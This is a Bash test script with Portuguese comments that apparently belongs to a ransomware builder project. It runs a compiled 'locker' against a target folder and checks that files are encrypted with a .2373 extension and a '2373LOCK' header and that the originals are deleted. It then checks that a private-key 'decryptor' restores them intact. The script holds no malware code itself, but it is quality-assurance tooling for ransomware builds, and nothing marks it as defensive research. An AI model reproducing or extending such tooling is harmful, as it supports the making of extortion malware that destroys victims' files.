#!/bin/bash
# run-tests.sh — Testa o fluxo completo: gerar keys → locker → decryptor → diff
set -e

PASS=0
FAIL=0

pass() { PASS=$((PASS+1)); echo "  [PASS] $1"; }
fail() { FAIL=$((FAIL+1)); echo "  [FAIL] $1"; }

echo "=== Ransom Locker/Decryptor Integration Test ==="
echo ""

# Verificar que binários existem
if [ ! -f /test/locker_linux ] || [ ! -f /test/decryptor ]; then
  echo "[!] Binários não encontrados em /test/"
  echo "[*] Monte: -v ./compiler/ransom/builds/<id>:/test/bin"
  echo "[*] Precisa de: locker_linux, decryptor, private_key.pem"
  exit 1
fi

chmod +x /test/locker_linux /test/decryptor

echo "[1] Arquivos antes da criptografia:"
ls -la /test/target/
echo ""

echo "[2] Executando locker..."
cd /test/target
/test/locker_linux 2>&1 || true
echo ""

echo "[3] Verificando arquivos .2373:"
ENCRYPTED=$(ls /test/target/*.2373 2>/dev/null | wc -l)
if [ "$ENCRYPTED" -gt 0 ]; then
  pass "Encontrados $ENCRYPTED arquivos .2373"
  ls -la /test/target/*.2373
else
  fail "Nenhum arquivo .2373 criado"
fi
echo ""

echo "[4] Verificando MAGIC header (2373LOCK):"
for f in /test/target/*.2373; do
  MAGIC=$(head -c 8 "$f" 2>/dev/null)
  if [ "$MAGIC" = "2373LOCK" ]; then
    pass "$(basename $f): MAGIC OK"
  else
    fail "$(basename $f): MAGIC inválido"
  fi
done
echo ""

echo "[5] Verificando que originais foram removidos:"
if [ ! -f /test/target/secret.txt ] && [ ! -f /test/target/config.json ]; then
  pass "Originais removidos (renomeados para .2373)"
else
  fail "Originais ainda existem"
fi
echo ""

echo "[6] Executando decryptor..."
if [ -f /test/private_key.pem ]; then
  /test/decryptor /test/private_key.pem /test/target 2>&1 || true
  echo ""

  echo "[7] Verificando roundtrip:"
  for name in secret.txt config.json binary.dat small.txt; do
    if [ -f "/test/target/$name" ]; then
      if diff -q "/test/target/$name" "/test/target/backup_$name" >/dev/null 2>&1; then
        pass "$name: roundtrip OK (idêntico ao original)"
      else
        fail "$name: roundtrip FALHOU (conteúdo diferente)"
      fi
    else
      fail "$name: não restaurado pelo decryptor"
    fi
  done
else
  echo "  [SKIP] private_key.pem não encontrado — skip decryptor test"
fi

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
exit $FAIL
